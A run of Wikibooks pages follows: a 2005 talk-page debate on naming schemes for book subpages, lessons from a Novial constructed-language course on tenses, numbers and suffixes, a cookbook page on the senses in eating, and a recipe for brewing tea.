;Subpage disadvantages:
I put the following disadvantages for subpages which seem flavored by personal taste (&quot;..are very annoying..&quot;) to the discussion section, and converted the points above to a more neutral tone --[[User:Andreas Ipp|Andreas]] 08:55, 2 Apr 2005 (UTC)
* Hierarchy is often wrong. [[Cookbook:Anise|Anise]] is a spice, herb, and vegetable. [[Cookbook:Whisk|Whisk]] is both a cooking technique (verb) and a cooking tool (noun). Subpages do not allow for this; they only support tree structures.
*: This point should probably go under &quot;flat vs. structured&quot;. As pointed out above, I can have a flat hierarchy with all delimiters (&quot;/&quot;, &quot;:&quot;), as I can have a deep tree structure with all delimiters (e.g. Cookbook:Spices:Anise vs. Cookbook/Anise). --[[User:Andreas Ipp|Andreas]] 08:55, 2 Apr 2005 (UTC)
*:: No, because the &quot;/&quot; delimiter is special. It has built-in wiki support that enforces a tree. This is no good.
* Subpages are very annoying if you wish to process wiki text as files. For example, one might save wiki text to files on a Linux system so that the grep command (or a slightly more complicated script) can be used. Having the &quot;/&quot; makes this awkward. Shell wildcard expansion fails, so the &quot;find&quot; command will be needed. Files can no longer simply be saved; a &quot;mkdir&quot; command will be required.
*: If a structure is &quot;annoying&quot; or not probably depends on what you want to do, how many wikibooks you want to process, and so on. I agree, if you had scripts working with your cookbook, and after a change they don't work anymore, this is annoying, but imagine that each wikibook would have its own url (cookbook.wikibooks.org, kochbuch.wikibooks.org, howtobuildacomputer.wikibooks.org,...) and you want to process them - wouldn't you put the pages of each of those books into a separate directory before processing? (some pages might have the same name!) So, this is what the &quot;/&quot; delimiter automatically does for you! --[[User:Andreas Ipp|Andreas]] 08:55, 2 Apr 2005 (UTC)
*:: I'd want to process just one book actually, the cookbook. What I don't want to see is Cookbook/Vegetable/Anise, Cookbook/Spice/Anise, and Cookbook/Herb/Anise. What are they going to be, symlinks? Duplicate copies? Hard links? In any case, this artificially enforced hierarchy is going to make a mess.
*::: What about Glossary/Anise? I'm not trying to change existing wikibooks, but find the most useful form for many few pages long wikibooks that pop up without a definite naming scheme. Since many beginning wikibooks even lack navigational templates, the best way for those new books would be to have an automatic link back to their main page, and enforce that all pages start with the very same bookname. This is what subpages do.
*::: I see that for significantly larger projects pseudo-namespaces make sense as well, that is why I suggest a double policy: Subpages for books that have a linear structure (you read them from the beginning to the end), and namespace-like for collections of items like the cookbook. What do you think about this compromise? --[[User:Andreas Ipp|Andreas]] 06:11, 3 Apr 2005 (UTC)
*::: People keep raising exceptions as to why a scheme won't work. Whatever scheme (or schemes) is settled upon there are going to be special cases that don't work (and therefore require a workaround). I agree that subpages works well for linear books and namespace for collections so I think adopting both is a good idea. Mixing the two is obviously less desirable so a workaround may be required for a liner book that belongs to a collection (e.g. a linear programming textbook inside the programming namespace). --[[User:M.linger|M.linger]] 6 July 2005 03:51 (UTC)

kelvSYC's thoughts on the issue:
I believe good consistent organization is a must.  Thus, the naming scheme should be related to the scheme used for templates/categories, etc.  So my thoughts:
* Whatever the convention is, each and every existing Wikibook should be converted to the standard convention.
* A title with no delimiters, to me, implies a separate Wikibook.  Categories should organize parts of books (eg. textbook answer keys) as well as books that are related (eg. [[Abstract Algebra]] and [[Linear Algebra]] should be categorized as &quot;mathematical textbooks&quot;).  As it is entirely possible that books are part of other books, the category system should reflect that.
* Categories can also be used for, say, an automatic indexing feature (see [[Wikibooks Pokédex]]), but it should be avoided
* Only large overly general books deserve separate namespaces.  Good examples would be [[Cookbook]], [[Programming]], and [[Game Guides and Strategy]].
* Table of contents, indices, and all that should be colon-delimited if the book's title page does not contain them (eg. &quot;Foo:Table of Contents&quot;, &quot;Bar:Alphabetical Index&quot; vs. &quot;Baz/Chapter 1&quot;)
* Actual book content should be in subpages, whenever possible.
* For books with such a structure, a top-level subpage with custom up-links should be provided (provided we can hide the default up-links).
* The about pages (notes for contributors, etc) should be colon-delimited (eg. &quot;Foo:About&quot;, &quot;Bar:Contributers Notes&quot;).
* Bracket syntax should '''never''' be used.
* Books should be moderately structured: the hierarchy within a book should be as structured as possible, but flat enough so that names are not too long.  (even if it means we have a very long page)  Hierarchies should not be more than, say, three or four levels deep.
* All templates and categories specific to a single book should start with the name of the book. (eg. &quot;Template:Foo:TOC&quot;, &quot;Category:Bar:Pages on baz&quot;)
* For pages that are part of multiple books, put it as a subpage of one book and have all others redirect to it, and make custom up-links.  Which book it should be part of should be up to discussion.

I think that it is safe to say that we will adopt either the Bookname:subpage or the Bookname/subpage hierchy.  I tend to go with the former because so many books use their own templates as navigation techniques, so the Bookname/subpage hierchy would look odd.  Also, I think that since the other kinds of namespaces, such as Wikibooks: and Talk: and User:, etc. are done in this manner it will be intuitive to most users.  As for substructure, I believe that should be the decision of the individual book writers- there are simply too many different circumstances.  Some books are better divided into chapters only, some are better divided further.--[[User:Naryathegreat|Naryathegreat]]|[[User talk:Naryathegreat|(talk)]] 19:36, 17 Apr 2005 (UTC)

== Voting ==
Ideally, the Wikibooks community should propose a method above and vote for a Wikibooks wide scheme for naming hierachies. This will have the advantage of consistency and ease of use within Wikibooks.

Wikibooks should accumulate a number of naming hierachy schemes and then set a vote, which should happen here.

==New wikistats report for Wikibooks==
I'm glad to announce a new report for Wikibooks, generated periodically by the Wikistats job. You'll find here an overview of books, their content and some stats. I discovered there are at least 6 naming schemes for chapters. This made it difficult to automate extraction of chapter names, so in some cases the grouping of chapters may look a bit odd. I'm sure this will improve when the ongoing discussion about standardisation of article titles bears fruit. Please look at [http://en.wikipedia.org/wikistats/wikibooks/EN/WikiBookIndex.htm Statistics per Wikibook] [[User:Erik Zachte|Erik Zachte]] 15:18, 9 Apr 2005 (UTC)</text>

===&lt;font color=&quot;#FF9933&quot;&gt;Verbs – Past and Conditional Tenses&lt;/font&gt;===

The past preterite (simple past) is formed with the auxiliary verb '''did '''before the present or equivalently by adding '''-d''' ('''-ed''' after a consonant) to the present:
*'''me did parla (= me parlad) ''' – ''I spoke''
*'''vus non did dona (= vus non donad) ''' – ''you didn’t give'' (Literally: ''you not gave'')
*'''les esed (= les did es) bon''' – ''they were good''

Note that the English auxiliaries ''do'' and ''did'' used in questions and negative statements are not translated:
*'''ob vu veni''' – ''do you come'? '' (Literally: ''is it that you come? '')
*'''lo non dikte''' – ''he does not say'' (Literally: ''he not says'')
*'''ob vu parlad? (= ob vu did parla?) ''' – ''did you speak? '' (Literally: ''is it that you spoke? '')
*'''les non envadad (= les non did envada)''' – ''they did not enter'' (Literally: ''they not entered'')

The perfect tense is formed with the auxiliary verb '''ha''' before the present form:
*'''me ha parla''' – ''I have spoken''
*'''vus non ha dona''' – ''you have not given''
*'''les ha es bon''' – ''they have been good'' 
*'''ob les ha es bon?''' – ''have they been good?'' 
  
The conditional of a verb is formed with the auxiliary verb '''vud '''before the present:
*'''lo vud dikte''' – ''he would say''
*'''les vud parla''' – ''they would speak''

===&lt;font color=&quot;#FF9933&quot;&gt;Numbers – Cardinal and Ordinal&lt;/font&gt;===

The cardinal numbers are:
*'''sero''' – ''zero''
*'''un''' – ''one''
*'''du''' – ''two''			
*'''tri''' – ''three''			
*'''quar''' – ''four''			
*'''sink''' – ''five''			
*'''six''' – ''six''			
*'''set''' – ''seven'' 			
*'''ot''' – ''eight''			
*'''nin''' – ''nine''			
*'''dek''' – ''ten''			
*'''dek-un''' – ''eleven''		
*'''dek-du''' – ''twelve''		
*'''dek-tri''' – ''thirteen''				
*'''dek-quar''' – ''fourteen''		
*'''dek-sink''' – ''fifteen''		
*'''dek-six''' – ''sixteen''		
*'''dek-set''' – ''seventeen''		
*'''dek-ot''' – ''eighteen''		
*'''dek-nin''' – ''nineteen''		
*'''duanti''' – ''twenty''		
*'''duanti-un''' – ''twenty-one''
*'''duanti-du''' – ''twenty-two'' …etc.
*'''trianti''' – ''thirty''
*'''trianti-du''' – ''thirty-two''
*'''quaranti''' – ''forty''
*'''quaranti-tri''' – ''forty-three''
*'''sinkanti''' – ''fifty''
*'''sinkanti-quar''' – ''fifty-four''
*'''sixanti''' – ''sixty''
*'''sixanti-sink''' – ''sixty-five''
*'''setanti''' – ''seventy''
*'''setanti-six''' – ''seventy-six''
*'''otanti''' – ''eighty''
*'''otanti-set''' – ''eighty-seven''
*'''ninanti''' – ''ninety''
*'''ninanti-ot''' – ''ninety-eight''
*'''sent''' – ''a hundred''
*'''sent-duanti''' – ''120''
*'''sinksent-trianti-set''' – ''537''…etc.
*'''mil''' – ''a thousand''
*'''mil-un''' – ''1001''
*'''mil-sent''' – ''1100''
*'''mil-dusent-tri''' – ''1203''
*'''mil setsent-quaranti-du''' - ''1742''
*'''milione''' – ''a million''
*'''miliarde''' – ''a thousand million'' (American ''billion'')
*'''bilione''' – ''million million, billion'' (American ''trillion'')

Units, tens and hundreds are separated by hyphens for ease of reading. The tens are formed from the units with the ending '''-anti''' (notice the adjective ending as all numbers before a million are adjectives). Hundreds have their number in front of '''sent''': '''otsent''' – ''eight hundred''. Thousands, millions and higher are separated from their multiplier by spaces: '''ot mil''' – ''eight thousand''.
'''Milione, miliarde''' and '''bilione''' are nouns so multiples take the plural ending '''-s''':
'''tri miliardes setsent-sixanti-six miliones sent-quaranti-nin mil dusent-sixanti-set''' 
– (American:) ''three billion seven hundred and sixty-six million one hundred and forty-nine thousand two hundred and sixty-seven''  (3 766 149 267) 

Ordinal numbers are formed from the cardinals with the ending '''-esmi''' which is added only to the last component of the number:
*'''unesmi''' – ''first''
*'''duesmi''' – ''second''
*'''trisent-quaranti-sinkesmi''' – ''three hundred and forty-fifth'' (345th)

Ordinals may be abbreviated as: '''1smi (1&lt;sup&gt;smi&lt;/sup&gt;), 2smi (2&lt;sup&gt;smi&lt;/sup&gt;), 345smi (345&lt;sup&gt;smi&lt;/sup&gt;) ''' etc.

===&lt;font color=&quot;#FF9933&quot;&gt;The Indefinite Preposition&lt;/font&gt;===

The preposition '''ye''' has no definite meaning, and is used when it is not obvious which preposition is exactly appropriate in a literal sense:
*'''ye akurateso de''' – ''with/at an accuracy of''
*'''ye dis die''' – ''on this day''

===&lt;font color=&quot;#FF9933&quot;&gt;The Reflexive Pronoun&lt;/font&gt;===

The reflexive pronoun is '''se''', ''himself, herself, itself, themselves'' (third person only). Note that '''se''' is used only when the object of the verb refers back to the subject of the verb. 
*'''la observa se''' – ''she observes herself''
*'''la observa la''' – ''she observes her''
*'''lo parla a se''' – ''he speaks to himself'' 
*'''lo parla a lo''' –'' he speaks to him''
*'''les parla a sen hundes''' – ''they speak to their (own) dogs''
*'''les parla a lesen hundes''' – ''they speak to their dogs'' (somebody else’s dogs)

This pronoun avoids awkward ambiguity which sometimes occurs in English.

The first and second persons use no special pronoun:
*'''me observa me''' – ''I observe myself'' (Literally: ''I observe me'')
*'''vu parla a vu''' – ''you speak to yourself''  (Literally: ''you speak to you'')

===&lt;font color=&quot;#FF9933&quot;&gt;Adjectival Suffix -AL&lt;/font&gt;===

Novial uses prefixes and suffixes added to root words to make related words. 

The suffix '''-al(i) ''' is added to a root word X to make an adjective meaning “of X or X related”.
Any final '''-e, -o, -a''' or '''-i''' of a noun is removed to provide the root then '''-al(i) ''' is added to the root.

*'''nature – natural''' (''nature – natural'')
*'''universe – universal''' (''universe – universal'') 
*'''natione – national''' (''nation – national'')
*'''doktore – doktoral''' (''doctor – doctoral, of a doctor'')
*'''familie – familial''' (''family – family related, of a family'')
*'''sientie –siential''' (''science – scientific, science related'')
*'''laboro – laboral''' (''work – work related, of work'')
*'''alkali – alkalal''' (''alkali – of alkali'')
*'''mensu – mensual''' (''month – monthly, of a month'')

Notice that a final '''-u''' is part of the root and not dropped before adding '''-al'''. Novial is here much more regular than English. Many derived adjectives are similar to the English but it is not possible for all to be so, because the English derivation system is very mixed and irregular.

===&lt;font color=&quot;#FF9933&quot;&gt;Substantival Suffix -ESO&lt;/font&gt;===

The suffix '''-eso''' is added to the root of an adjective (i.e. without the final '''-i''') to form the corresponding abstract noun:

*'''bon – boneso''' (''good – goodness'')
*'''akurati – akurateso''' (''accurate – accuracy'')
*'''inteligenti - inteligenteso''' (''intelligent – intelligence'')

If the sense permits, more than one suffix may be added to the root:

*'''amike – amikal – amikaleso''' (''friend – friendly – friendliness'')

Notice again how irregular the English system is.

==&lt;font color=&quot;#CC6600&quot;&gt;Grammar Notes&lt;/font&gt;==

===&lt;font color=&quot;#FF9933&quot;&gt;Relative Pronouns&lt;/font&gt;===

The relative pronoun in English takes several forms (''who, whom, which, that''). In Novial one word, '''kel''', can serve for all of these:
*'''evita pasiones, kel porta sufro ''' – ''avoid passions which (that) bring suffering ''
*'''li yuna, kel me ama, es bel''' – ''the young woman, whom (that) I love, is beautiful ''
*'''me donad lu al proprietere, kel es oldi viro ''' – ''I gave it to the owner who is an old man ''
*'''li stule, sur kel me sida, es grandi ''' – ''the chair, on which I sit, is big ''

The English possessive (''whose'') is translated as '''kelen''' or '''de kel''':
*'''li farmere, kelen filia me ama, es oldi viro ''' – ''the farmer, whose daughter I love, is an old man ''
*'''li farmere, li filia de kel me ama, es oldi viro ''' – ''the farmer, the daughter of whom I love, is an old man ''

If necessary in order to avoid ambiguity the endings '''-o, -a, -u'''  may be used to indicate sex or lack of sex and '''-s''' may be used to indicate a plural:
*'''li filia del doktoro, kela me ha renkontra, es inteligenti''' – ''the daughter of the doctor, whom I have met, is intelligent '' (I met the daughter not the doctor)
*'''tima li ansestres e li pasiones, kelus pove ankore veni a vu''' – ''fear the ancestors and the passions, which can yet come to you '' (the passions can come not the ancestors)


{{Novial/Exercise|Relative Pronouns
|In the following sentences translate the English in brackets into Novial.  

# Lo parlad a Holmes (''who'') sidad in (''his own'') stule..
# La lekte li manuskrite (''which'') es sur li table.
# Lo have pasiones fro (''which'') lo sufra.
# Me sal renkontra li proprietere (''whose'') filia es yuni.
# Li farmere (''who'') proprieta li lande es oldi.
# Me have (''this'') importanti probleme.
# (''That'') naratione es stranji.
# Me sal dikte (''what'') me lernad fro (''that'') manuskrite.
# Dis yuno ama li (''young woman'').
# Li (''young people'') ama (''their own'') amikes.
|
# Lo parlad a Holmes '''kel''' sidad in '''sen''' stule..
# La lekte li manuskrite '''kel''' es sur li table.
# Lo have pasiones fro ''' kel''' lo sufra.
# Me sal renkontra li proprietere ''' kelen''' filia es yuni.
# Li farmere '''kel''' proprieta li lande es oldi.
# Me have '''disi''' importanti probleme.
# '''Ti''' naratione es stranji.
# Me sal dikte '''tu kel''' me lernad fro '''ti''' manuskrite.
# Dis yuno ama li '''yuna'''.
# Li '''yunes''' ama '''sen''' amikes.
}}

===&lt;font color=&quot;#FF9933&quot;&gt;Verbs – Future Tense&lt;/font&gt;===

The future tense is formed by placing the auxiliary verb '''sal''' in front of the present tense of the verb:
*'''me sal evita tal stranji viros ''' – ''I shall avoid such strange men''

===&lt;font color=&quot;#FF9933&quot;&gt;Adverbs from Adjectives&lt;/font&gt;===

An adjective may be converted to a corresponding adverb by adding '''-m''' after the final '''-i''':
*'''diferanti ''' – ''different ''
*'''diferantim ''' – ''differently ''
*'''proximi ''' – ''close ''
*'''proximim ''' – ''closely ''

(Note that '''proxim''' without the '''-i''' is a preposition meaning ''close to'' (something).)

===&lt;font color=&quot;#FF9933&quot;&gt;This and That – Pronouns from Adjectives&lt;/font&gt;===

As we have already seen with personal pronouns and nouns with natural sex differences, Novial has convenient endings to distinguish sexless things, male, female and male or female. The demonstrative adjectives '''ti''' (''that'') and '''disi''' (''this'') use the same endings to provide the corresponding pronouns with such distinctions. Remember that adjectives themselves (here '''ti''' and '''disi''') do not change form or agree with their noun. However, the derived pronouns have alternative endings to indicate sex and number:

*'''ti kose''' – ''that thing''
*'''tu''' – ''that (one) '' (sexless thing)
*'''te''' – ''that one'' (male or female)
*'''ta''' – ''that one'' (female)
*'''to''' – ''that one'' (male)
*'''tus''' – ''those (ones) '' (sexless things)
*'''tes''' – ''those'' (male or female or a mixture of both)
*'''tas''' – ''those'' (female)
*'''tos''' – ''those'' (male)


*'''disi kose''' – ''this thing''
*'''disu''' - ''this (one) '' (sexless thing)
*'''dise''' – ''this one'' (male or female)
*'''disa''' – ''this one'' (female)
*'''diso''' – ''this one'' (male)
*'''disus''' – ''these'' (sexless things)
*'''dises''' – ''these'' (male or female or a mixture of both)
*'''disas''' – ''these'' (female)
*'''disos''' – ''these'' (male)

As with the third person pronouns, '''le''' and '''les''', it is convenient to use '''te, tes''' and '''dise, dises''' to indicate either sexless things or persons or a mixture of both without being specific.

Pronouns may be formed from other adjectives in the same way:

*'''yuni filia''' – ''young daughter''
*'''yuna''' – ''young woman'' (also young female of animals)
*'''yuni filio''' – ''young son''
*'''yuno''' – ''young man'' (also young male of animals)
*'''yuni home''' – ''young person''
*'''yune''' – ''a youth''
*'''yunes''' – ''youths, young ones''
*'''yunu''' – ''young thing''

===&lt;font color=&quot;#FF9933&quot;&gt;Verbal Suffixes -ISA and -IFIKA&lt;/font&gt;===

The suffixes '''–isa''' and '''–ifika''' are used to make verbs meaning to ''make'', ''make into'' or ''render''. For example: 

*'''liberi – liberisa''' (''free – liberate, make free, free'')
*'''real – realisa''' (''real – make real, realize'')

*'''kurti – kurtifika''' (''short – shorten, make short'')
*'''veri – verifika''' (''true – verify'')

Verbs meaning to ''provide with'' , ''cover with'' are made with '''–isa''' (but not with '''–ifika'''):

*'''alkohole – alkoholisa''' (''alcohol – alcoholize'')
*'''lume – lumisa''' (''light – light (up)'')

===&lt;font color=&quot;#FF9933&quot;&gt;Verbal Suffix -ERE&lt;/font&gt;===

The person who performs an action is formed from a verb with the suffix '''–ere'''.

*'''proprieta – proprietere''' (''to own – owner, proprietor'')
*'''fuma – fumere''' (''to smoke – smoker'')
*'''visita – visitere''' (''to visit – visitor'')

==&lt;font color=&quot;#CC6600&quot;&gt;Grammar Notes&lt;/font&gt;==

===&lt;font color=&quot;#FF9933&quot;&gt;Pluperfect Tense&lt;/font&gt;===

The pluperfect tense is formed by placing the auxiliary verb '''had''' in front of the present tense of the verb:
*'''lo had salta a sur li table''' – he had jumped onto the table

===&lt;font color=&quot;#FF9933&quot;&gt;Prepositions and Adverbs from Prepositions&lt;/font&gt;===

Adverbs are formed from prepositions by adding '''-u''' as seen in these examlpes:

*'''lo non es inu''' – ''he is not in''
*'''prou (= pro tu) ''' – ''therefore, on account of that''
*'''anteu (= ante tu) ''' – ''formerly, before that''
*'''durantu''' – ''during that time, meanwhile''
*'''li hundes kursed eku''' – ''the dogs ran out'' (of somewhere)
*'''exeptu (=exept tu) ''' – ''with that exception''
*'''lo sidad proxim li porte, e lon filia sidad proximu (= proxim lo) ''' –
''he sat near the door and his daughter sat nearby (= near him) '' 
*'''lo vadad subu''' – ''he went down(wards) ''
*'''les es kunu noktim e jornim''' –  ''they are together night and day''


===&lt;font color=&quot;#FF9933&quot;&gt;Prepositions before the Infinitive&lt;/font&gt;===

English phrases such as ''without going, before seeing'' etc. are translated with the appropriate preposition followed by the infinitive (same as the present tense):

'''me had departa ante vida la''' – ''I had left before seeing her''

'''nus vadad por vida la''' – ''we went (in order) to see her''

===&lt;font color=&quot;#FF9933&quot;&gt;Infinitive Clauses&lt;/font&gt;===

The following examples show this English construction and how it can be translated:

*'''me voli ke vu veni''' – ''I want you to come'' (Literally: '' I want that you come'')

Use a preposition with a definite literal meaning if it makes sense: 
*'''la sendad li serveres por porta manjaje''' – ''she sent the servants to bring food''

Another way to express the infinitive clause is seen in the second of these examples:
*'''les varta ke me ariva''' – ''they wait for me to arrive'' (Literally: ''they wait for that I arrive'')
or:
*'''les varta men arivo''' – ''they wait for my arrival''

Where '''arivo''' is the verbal noun (''arrival'' or ''arriving'') derived from the verb '''ariva'''. (This will be covered thoroughly in [[Novial/Hound_Lesson_6#E.2FA.2FO_Words|lesson 6]])

However, the following is grammatically identical and may be used:
*'''me voli vun venio''' – ''I want you to come'' (Literally: ''I want your coming'').

===&lt;font color=&quot;#FF9933&quot;&gt;Comparative and Superlative&lt;/font&gt;===

Adjectives and adverbs are compared as follows:
 
*'''plu bon kam''' – ''better than''
*'''tam bon kam''' –  ''as good as''	 
*'''min bon kam''' –  ''less good than
*'''maxim bon ek''' – ''best (out) of''
*'''minim bon ek''' – ''least good (out) of''
 
*'''la es li maxim grandi''' – ''she is the biggest''
*'''la es plu grandi kam me''' – ''she is bigger than I (am) ''
*'''la es tam grandi kam me''' – ''she as big as I (am) ''
*'''la es min grandi kam me''' – ''she is less big than I (am) ''
*'''la es li minim grandi''' – ''she is the least big''

*'''lo kurse maxim bonim ek les''' – ''he runs best out of them''
*'''lo kurse plu bonim kam me''' – ''he runs better than I''
*'''lo kurse tam bonim kam me''' – ''he runs as well as I''
*'''lo kurse min bonim kam me''' – ''he runs less well than I''
*'''lo kurse minim bonim ek nus''' – ''he runs least well out of us'' 
 
'''Kam''' is used in making comparisons, even where English does not use than: 
*'''me prefera disu kam tu''' – ''I prefer this to that''

Translate ''as good as possible'' and similar phrases like this: 
*'''maxim bon posibli'''

{{cookwork}}

It is a held contention that food is more than fuel, and that eating should be a pleasure, appealing to all the senses. This page considers some basic principles.

== Sight ==
The appearance of food can be a major contribution to enjoyment. Arrange the food on the plate with the same care you would use in creating a work of art - balancing colors and forms in a harmonious arrangement. To show off the food and put everyone at ease about cleanliness, use bright white (not yellowish) lighting with pure white dishes and clear glasses. 

== Taste ==
The tongue recognises five basic flavors: salt, sweet, savoury, bitter and sour. One of the keys to a successful meal is to balance these, both within individual dishes and across different courses. It is usual to ready the palate with a cleansing neutral dish such as a consomme. Finish a formal meal with a sweet dessert, which customarily marks the psychological end of the event.

It's important to note that the hotness of a chile pepper is not a taste. The hotness is actually pain, so it affects the skin. Caution must be taken when chile peppers are handled.

== Smell ==
The most important sense in preparing and cooking food is the sense of smell. It adds subtlety to the experience, which the tongue itself cannot recognise. The smell of food being prepared is one of the greatest stimulators of appetite.

== Sound ==
Think about the acoustic environment. Many meals in big restaurants are ruined because their surroundings are just too noisy. A shared meal should encourage conversation, and too much background noise can ruin that. Rule of thumb: the more people at the meal, the louder the background noise can be. If you're going to have background music, match the mood to the food. A classic [[Cookbook:Bouillabaisse|bouillabaisse]], for example, is likely to taste better to a soundtrack of Georges Brassens.

== Touch ==
Touch might be better described as &quot;texture&quot;.  The crumb of a baked good can be coarse or fine, the texture of one cut of meat may tend to be more tender or tough than another, and a family may prefer creamy smooth mashed potatoes or may enjoy them more with some lumps left in.  The purpose of many techniques in cookery and baking is to allow the cook to control the texture of the finished product.

== Temperature ==
The temperature at which a food is served can affect the way it is experienced. Generally, sweet foods can be served cold (like ice cream), while for more subtle and aromatic foods a warmer temperature releases more of the flavor.</text>

      <text xml:space="preserve">{{recipe}} | [[Cookbook:Beverages|Beverages]] | [[Cookbook:Cuisine_of_the_United_Kingdom|Cuisine of the United Kingdom]]

'''A nice cup of tea''' is the usual answer in [[Cookbook:Cuisine of the United Kingdom|Britain]] and [[Cookbook:Cuisine of Ireland|Ireland]] to any everyday problem. Nothing is so bad that a nice cup of [[Cookbook:Tea|tea]] with a friend or family member can't make it better.

==Ingredients==
[[Image:Milk clouds in tea.jpeg|thumb|right]]

;By the cup
: ''Yield: 1 cup''
* 6-8 fl oz (20-25 cL) hot [[Cookbook:Water|water]]
* 1 measure of [[Cookbook:Tea|tea]] in an infuser or 1 tea bag
* Sweetener, such as [[Cookbook:Sugar|sugar]] or [[Cookbook:Honey|honey]], to taste
* [[Cookbook:Milk|Milk]] or [[Cookbook:Lemon|lemon]] to taste


;By the pot
: ''Yield: 4 cups''
* 32 fl oz (1 L) of hot water
* 3-5 measures of loose tea, in an infuser if you like
: Serve with:
* Milk or lemon to taste
* Sweetener, such as sugar or honey, to taste

==Procedure==

[[Image:Nice Cup of Tea.jpg|right|thumb|A nice cup of tea, milk and no sugar]]
;Preparing and serving the tea
# Pour freshly drawn water (see [[#Water, temperature, infusing time, and product variations|note below]]) into a tea kettle. Electric kettles are fast and convenient.
# If infusing a pot of tea, pour some hot tap water into your teapot and let stand for about several seconds to a minute to pre-warm it. Alternately, you can swish some of the hotter boiling water from your kettle around in the teapot for a few seconds. Pour out this water before adding the tea to the teapot.
# If using loose tea, prepare the tea
## Commonly one-half to one tea measure (or rounded teaspoon if you do not have a tea measure) is added per desired cup of tea. Some people add an extra measure &quot;for the pot&quot; (e.g., if 4 cups of tea are desired, 5 measures of tea would be used. It really is a matter of personal preference.)
## If you are using an infuser, be sure it is closed tightly so the tea does not spill into the pot. Rinse the tea-filled infuser briefly under cool tap water to wash away tiny flakes that would otherwise drift into the teapot.
## If using a filter basket infuser, do not overfill the basket (refer to the instructions that came with your basket). The brief rinse is usually not necessary unless the basket's mesh is quite porous.
## Simply dropping loose tea into the teapot is also an option, though you may want to strain the tea as you pour it into the cups.
# Place the tea or tea bag into the teapot.
# When the water reaches the preferred temperature (see [[#Water, temperature, infusing time, and product variations|note below]]), pour it from the tea kettle into the teapot or single-serving teacup. As you pour, try to avoid pouring directly onto the tea (especially important for green and white teas) to avoid scalding the leaves.
# Allow the tea to infuse quietly (i.e., do not stir the teapot or &quot;dunk the teabag&quot;). Agitating the tea releases more of the bitter compounds and degrades the taste. Watch the time to avoid over-infusion (see [[#Water, temperature, infusion time, and product variations|note below]]), and remove the infuser or tea bag when the time is up. If you did not use an infuser or tea bag, pour the tea into cups for immediate consumption.
# Remember that the tannins in tea stain, so it is advisable to pour the tea over a non-staining surface, wipe up any spills quickly, and do not leave tea standing in a teapot for long periods of time.

&lt;div style=&quot;clear:both;&quot;&gt;&lt;/div&gt;
;Adding sweeteners and lemon or milk
[[Image:Tea bags.jpg|thumb|left|Tea bags are convenient, but tea purists often despise them]]
* Generally, green and white teas need no sweetener or milk added to them for a delicious taste if prepared properly. some research indicates that adding lemon to green tea may make some of the healthful compounds in the tea more easily available to the body, and it provides a different, fresh taste to the tea.
* Lemon lightens the color of tea and may accentuate any bitterness in the tea
* Lemon pairs well with citrus-flavored teas, such as the bergamot-enhanced &quot;Grey&quot; teas (e.g., Earl Grey, Lady Grey, etc.), and unflavored black teas. Milk pairs well with sweet, flowery, or &quot;fruity&quot; teas, or with any black tea in which you wish to reduce bitterness.
* Never combine milk and lemon in the same cup of tea or the milk will curdle into lumps.
* Always add sweeteners to tea before adding any milk; otherwise, the milk will cool the tea, and the sweetener will not dissolve properly. For better dissolving, it is preferable to add several small amounts of sweetener to the tea, stirring each time, rather than adding a large amount of sweetener at once.
* Chai teas by definition require the addition of milk, ranging from one-fourth to one-half of the total volume, and a sweetener. The milk may be warmed if serving hot chai. Otherwise, cold milk and ice cubes make a lovely iced chai.

&lt;div style=&quot;clear:both;&quot;&gt;&lt;/div&gt;

==Water, temperature, infusion time, and product variations==
[[Image:Teestrauch Detail.jpg|right|thumb|Tea plant (''Camellia Sinensis'') growing in a tea plantation]]
For the freshest tasting cup of tea, you should always use mineral water or freshly drawn water direct from the tap that has been running for a while. Standing water loses oxygen, and the resulting tea tastes flat. If your tap water is chlorinated, a compromise can be reached by drawing fresh water and letting it stand uncovered for a couple of hours to allow the chlorine taste to leave the water; although, using mineral water is a quick and easy solution. Boiling the water for long periods also removes oxygen from the water, so always use fresh water (do not re-boil it), and use the water quickly after it comes to a boil.

[[w:White Tea|White tea]] and [[w:Yellow Tea|Yellow tea]] are the most delicate of all teas and require a water temperature of 60-65°C need a infusion time of 2 minutes. Using too high a tea or steeping for too long has a tendency to mask some of the delicate nuances of the tea and leave it a bit bitter.

[[w:Green tea|Green tea]] requires water that is (65-75°C). You may either pour the hot water from the tea kettle into the teapot prior to the boil, or allow the water to come to a full boil (the better choice if water quality is questionable) and then allow the water to cool again prior to pouring over the tea leaves. Green teas usually infuse anywhere from :30 seconds to 2 minutes. Bitterness in the tea is usually the result of overheating the water, infusing the tea for too long, or both.

[[w:Oolong tea|Oolong teas]] are 20-80% oxidized, thus their preparation method usually falls somewhere in between green and black teas. The water should just be below a boil, 75-80°C), and the infusion time is typically 2-3 minutes.

[[w:Black tea|Black tea]] (aka. [[w:Red Tea|Red tea]], having been oxidized and more stable, infuses best with water that is 80-90°C. Infusion times are generally longer, with 3-5 minutes being a typical time. ''Chai'' and other teas combined with fragrant herbs and spices may require additional infusion time to allow the full flavor to develop. Common [[w:Black Tea|Black Teas]] are [[w:Darjeeling tea|Darjeeling tea]] and [[w:Assam tea|Assam tea]] from Northern India.

Puerh Tea is the only type of tea that is truly fermented as the oxidation process is never halted during processing. These teas are often retained in storage for a minimum of 20 years before going to market. Their complex flavors robust constitution require full boiling water.

Many premium grade teas can handle multiple infusions utilizing the same tea leaf. In fact, many tea subtly change flavor in subsequent infusions revealing flavors masked by stronger overtones of the tea. White and Green tea often tolerate 3-4 infusions, [[w:Yellow Tea|Yellow tea]] and [[w:Oolong tea|Oolong tea]] tolerate 5-8 infusions, [[w:Black tea|Black (Red) tea]] tolerates 3-5 infusions, and a good Puerh can sometimes last a dozen infusions or more. A good 'rule-of-thumb' to follow is to add 30 seconds to the first infusion time for each subsequent infusion.

[[w:Rooibos|Rooibos]] (''Aspalathus linearis'', often referred to as red tea but is different from a true red tea) and [[w:Honeybush|honeybush]] (''Cyclopia spp.'') are not true teas (i.e., they are not made from the ''Camellia sinensis'' plant), but are derived from African plants and are infused in a manner similar to tea. These are herbal 'teas' often referred to as tisanes. Read the instructions that came with the product. If no instructions came with it, infuse as you would black tea, and experiment with infusion times and water temperatures in future attempts until you find the flavor that most appeals to you.

[[w:Yerba mate|Yerba maté]] (''Ilex paraguariensis'') is a South American holly plant. Maté is a tea-like infusion that ''can'' be prepared in the same manner as green tea. However, there are many other methods that produce a very different (and some would say better) flavor. Detailed maté preparation is beyond the scope of this recipe.

&lt;div style=&quot;clear:both;&quot;&gt;&lt;/div&gt;

==A traditional view==
[[Image:Lipton Earl Grey in tin.jpg|thumb|left|Loose tea leaves traditionally offer the best flavor]]

